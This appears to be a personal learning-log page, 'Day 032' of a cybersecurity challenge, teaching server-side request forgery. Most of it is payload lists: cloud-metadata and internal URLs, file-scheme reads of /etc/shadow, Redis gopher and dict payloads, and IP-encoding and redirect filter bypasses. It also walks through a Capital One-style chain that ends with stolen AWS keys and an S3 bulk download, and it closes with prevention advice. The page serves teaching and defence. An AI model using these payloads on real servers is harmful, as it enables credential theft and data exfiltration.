# Day 032 - Server-Side Request Forgery (SSRF)

> **Challenge:** 100 Days of Cybersecurity | **Phase:** Offensive Security | **Difficulty:** Intermediate

---

## 🧠 The Concept

Sometimes the most powerful attack isn't exploiting the server directly.

It's making the server attack itself.

SSRF - Server-Side Request Forgery - tricks a server into making HTTP requests on your behalf. You tell it where to fetch something. It fetches from places you could never reach directly - internal services, cloud metadata, restricted APIs.

This is how the Capital One breach worked. $80 million fine. 100 million records exposed. One SSRF vulnerability.

---

## 🔄 How SSRF Works

```
Normal:
  You → Request → Server → Fetches external resource → Returns to you

SSRF:
  You → Request with malicious URL → Server fetches INTERNAL resource → Returns to you
                                               ↑
                              Internal services only the server can reach
```

The server becomes your proxy into a network you can't touch.

---

## 🎯 What SSRF Can Reach

```
Internal services:
→ http://localhost/admin          (admin panel not exposed externally)
→ http://192.168.1.1/             (internal network devices)
→ http://10.0.0.1:8080/           (internal apps on private IPs)
→ http://internal-db:5432/        (database via hostname)

Cloud metadata (most critical):
→ http://169.254.169.254/latest/meta-data/           (AWS)
→ http://169.254.169.254/latest/meta-data/iam/security-credentials/
→ http://metadata.google.internal/computeMetadata/v1/ (GCP)
→ http://169.254.169.254/metadata/instance           (Azure)

File system (via file:// scheme):
→ file:///etc/passwd
→ file:///etc/shadow
→ file:///proc/self/environ       (environment variables - may contain secrets)

Other protocols:
→ dict://localhost:6379/INFO      (Redis - read without auth)
→ gopher://localhost:6379/...     (Redis - execute commands)
```

---

## 🔍 Finding SSRF

Look for any parameter that accepts a URL or hostname:

```
url=, fetch=, src=, href=, path=, dest=, redirect=,
uri=, load=, open=, target=, link=, host=, domain=,
callback=, return=, image=, avatar=, import=, feed=
```

---

## 🧪 Basic SSRF Tests

```bash
# Step 1: Confirm outbound HTTP works
url=https://your-interactsh-id.oast.fun/test
# Check if your server receives the request

# Step 2: Reach localhost
url=http://localhost/
url=http://127.0.0.1/
url=http://0.0.0.0/
url=http://[::1]/

# Step 3: AWS metadata - most critical
url=http://169.254.169.254/latest/meta-data/
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Returns role name → then fetch credentials for that role
```

---

## 🚧 SSRF Filter Bypasses

```bash
# IP alternatives for 127.0.0.1
http://2130706433/          # decimal representation
http://0x7f000001/          # hex
http://0177.0000.0000.0001/ # octal
http://127.1/               # short form

# Localhost DNS aliases
http://localtest.me/        # resolves to 127.0.0.1
http://lvh.me/              # resolves to 127.0.0.1

# Redirect bypass
# Host a page at https://your-site.com/ssrf that returns:
# 302 Location: http://169.254.169.254/latest/meta-data/
url=https://your-site.com/ssrf

# URL confusion
url=http://evil.com@127.0.0.1/   # @ → goes to 127.0.0.1
url=http://127.0.0.1#.evil.com   # fragment ignored

# IPv6
url=http://[::1]/
```

---

## 💥 Capital One Attack Chain

```bash
# 1. Find SSRF parameter
POST /fetch
{"url": "http://169.254.169.254/latest/meta-data/"}
# Response reveals IAM role name

# 2. Steal temporary credentials
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-prod-role"}
# Response:
# {
#   "AccessKeyId": "ASIA...",
#   "SecretAccessKey": "abc123...",
#   "Token": "FQoG...",
# }

# 3. Use stolen credentials
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="abc123..."
export AWS_SESSION_TOKEN="FQoG..."

aws s3 ls                           # list all S3 buckets
aws s3 cp s3://sensitive-bucket/ .  # download everything
```

---

## 🛡️ Prevention

| Defence | How |
|---------|-----|
| Allowlist valid URLs | Only permit specific domains |
| Block internal IP ranges | Reject 127.x, 10.x, 172.16.x, 192.168.x, 169.254.x |
| Disable unused schemes | Block file://, dict://, gopher:// |
| IMDSv2 on AWS | Requires PUT token first - blocks simple SSRF |
| Network segmentation | App servers shouldn't reach sensitive internals |

---

## 🔑 Key Takeaways

- SSRF makes the server your proxy into networks you can't reach
- AWS metadata endpoint (169.254.169.254) is the most critical SSRF target
- Capital One: SSRF → metadata → IAM credentials → 100M records
- Allowlisting is the only reliable fix - blocklists have too many bypasses
- IMDSv2 on AWS eliminates the most common SSRF impact scenario

---

## 📚 Resources
- [PortSwigger SSRF Labs (free)](https://portswigger.net/web-security/ssrf)
- [PayloadsAllTheThings - SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)

---

## [⬅️ Day 031](../day031/) | [➡️ Day 033](../day033/)

*Part of my [100 Days of Cybersecurity](../README.md) challenge.*